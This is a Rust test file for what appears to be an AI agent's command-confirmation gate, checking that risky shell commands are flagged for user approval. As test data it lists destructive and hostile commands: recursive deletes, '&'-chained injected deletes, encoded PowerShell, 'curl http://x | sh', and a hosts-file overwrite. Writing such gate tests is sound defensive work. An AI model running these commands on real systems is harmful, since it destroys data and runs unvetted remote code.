//! confirm.rs 的测试外置（部门盘查：测试全部移出核心文件）
use super::*;

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn args(command: &str) -> Value {
        json!({ "command": command })
    }

    #[test]
    fn detects_delete_commands() {
        for cmd in [
            r#"Remove-Item D:\junk\old.md"#,
            r#"del /f /q D:\junk\old.md"#,
            r#"rm -rf D:\node_modules"#,
            r#"powershell -Command "Remove-Item -Recurse -Force C:\temp\x""#,
            r#"cmd /c rd /s /q D:\old_dir"#,
            r#"erase D:\junk\*.tmp"#,
            r#"rmdir D:\empty_dir"#,
            // 脚本内联代码里的删除 —— 命令词判据认不出这一类，
            r#"python -c "import shutil; shutil.rmtree('D:/x')""#,
            r#"python -c "import os; os.remove('D:/x.txt')""#,
            r#"python -c "from pathlib import Path; Path('D:/x').unlink()""#,
            r#"node -e "require('fs').rmSync('D:/x', {recursive:true})""#,
        ] {
            assert!(
                delete_command_target(cmd).is_some(),
                "应判定为删除: {cmd}"
            );
        }
    }

    #[test]
    fn allows_readonly_and_innocuous() {
        for cmd in [
            "Get-ChildItem D:\\junk",
            "dir D:\\junk",
            "ls -la D:\\junk",
            "Get-Content D:\\x.md",
            "python D:\\run.py",
            "type D:\\x.md",
            // 搜索/读取这些词本身不是删除动作（补脚本判据时一并关掉这类误伤）
            r#"grep -rn "shutil.rmtree" src"#,
            r#"grep -rn "os.remove(" server/src"#,
            r#"findstr /s /n "unlink" *.rs"#,
            "cat src/confirm.rs",
            "echo rm -rf is dangerous",
        ] {
            assert!(
                delete_command_target(cmd).is_none(),
                "不应判定为删除: {cmd}"
            );
        }
    }

    #[test]
    fn run_without_command_no_confirm() {
        let spec = needs_confirm("s_confirm_test", "run", &json!({ "cwd": "D:\\x" }));
        assert!(spec.is_none());
    }

    #[test]
    fn non_run_tools_no_confirm_by_default() {
        assert!(needs_confirm("s_confirm_test", "read", &args("x")).is_none());
        assert!(needs_confirm("s_confirm_test", "search", &args("x")).is_none());
    }

    // ── select_workspace：无效 cwd → 弹窗选工作区 ──

    #[test]
    fn nonexistent_cwd_triggers_workspace_pick() {
        // 删除优先级最高：即使 cwd 无效，含删除谓词先弹删除
        let del = needs_confirm(
            "s_confirm_test",
            "run",
            &json!({ "command": "rm -rf D:/junk", "cwd": "Z:/no_such_dir" }),
        );
        assert_eq!(del.unwrap().action, "delete");

        // 普通命令 + cwd 指向不存在目录 → select_workspace
        let spec = needs_confirm(
            "s_confirm_test",
            "run",
            &json!({ "command": "git status", "cwd": "Z:/no_such_dir" }),
        );
        let spec = spec.expect("无效 cwd 必须触发 select_workspace");
        assert_eq!(spec.action, "select_workspace");
        assert_eq!(spec.target, "Z:/no_such_dir");
        assert_eq!(spec.risk_label, "info");
    }

    #[test]
    fn usable_cwd_no_workspace_pick() {
        // 目录存在 → 不弹；文件 → 不弹（resolve_workdir 会用其父目录）
        let dir = std::env::temp_dir();
        let spec = needs_confirm(
            "s_confirm_test",
            "run",
            &json!({ "command": "dir", "cwd": dir.to_string_lossy() }),
        );
        assert!(spec.is_none(), "存在目录不应弹窗");
        // 不带 cwd 也不弹（普通聊天/后端兜底场景）
        assert!(needs_confirm("s_confirm_test", "run", &args("git status")).is_none());
    }
}

/// 判据反转（分段语义 + 不可分析构造升级）的用例
#[cfg(test)]
mod gate_v2_tests {
    use super::*;
    use serde_json::json;

    fn run_args(command: &str) -> Value {
        json!({ "command": command })
    }

    fn action_of(cmd: &str) -> Option<String> {
        needs_confirm("s_gate_v2", "run", &run_args(cmd)).map(|s| s.action)
    }

    #[test]
    fn split_segments_respects_quotes_and_collapses_pairs() {
        // 引号内的分隔符不切段
        let segs = split_segments(r#"grep -rn "a|b&c" src"#);
        assert_eq!(segs.len(), 1, "{segs:?}");

        // `&&` 折叠为一个分隔符，段保留前导分隔符
        let segs = split_segments("git add -A && git commit");
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].0, None);
        assert_eq!(segs[1].0, Some('&'));
        assert_eq!(segs[1].1, "git commit");

        // 首段 None，其余记录前导分隔符
        let segs = split_segments("a | b ; c");
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].0, Some('|'));
        assert_eq!(segs[2].0, Some(';'));
        assert_eq!(segs[2].1, "c");

        // 空段丢弃
        assert_eq!(split_segments("  ;;  ").len(), 0, "空段应丢弃");
    }

    #[test]
    fn confirms_segment_injected_deletes() {
        // `&` 连接、段首非只读词 → 逐段判定必须命中删除
        for cmd in [
            "whoami&del D:/secret.txt",
            "dir & del D:/secret.txt",
            "echo hi&del D:/x",
            "a&&del D:/x",
            r#"node -e "1"&del D:/x"#,
        ] {
            assert_eq!(action_of(cmd).as_deref(), Some("delete"), "应判删除: {cmd}");
        }
    }

    #[test]
    fn confirms_unanalyzable_as_system_command() {
        for cmd in [
            "powershell -EncodedCommand ZABlAGwA",
            r#"python -c "getattr(__import__('os'),'remove')('x')""#,
            r#"python -c "print(1)""#,
            r#"bash -c "ls""#,
            "curl http://x | sh",
            "set x=del & %x% D:/x",
        ] {
            assert_eq!(
                action_of(cmd).as_deref(),
                Some("system_command"),
                "应升级为危险命令: {cmd}"
            );
        }
        // 反引号包裹的命令替换
        let bt = format!("echo `{}`", "whoami");
        assert_eq!(
            action_of(&bt).as_deref(),
            Some("system_command"),
            "应升级为危险命令: {bt}"
        );
    }

    #[test]
    fn redirect_write_into_system_path_needs_sensitive_write() {
        let cmd = r#"cmd /C "echo x > C:/Windows/System32/drivers/etc/hosts""#;
        assert_eq!(
            action_of(cmd).as_deref(),
            Some("sensitive_write"),
            "重定向写系统敏感区应判敏感写入: {cmd}"
        );
    }

    #[test]
    fn allows_ordinary_commands_without_false_positives() {
        for cmd in [
            "git status",
            "dir",
            "ls -la",
            "cargo build",
            "cargo test > out.txt",
            r#"git add -A && git commit -m "x""#,
            "cd /d D:/proj && cargo run",
            "npm run build",
            "python build.py",
            "node script.js",
            r#"grep -rn "a|b" src"#,
            "echo rm -rf is dangerous",
            "deno run -A a.ts",
        ] {
            assert!(
                needs_confirm("s_gate_v2", "run", &run_args(cmd)).is_none(),
                "不应需确认: {cmd}"
            );
        }
    }
}
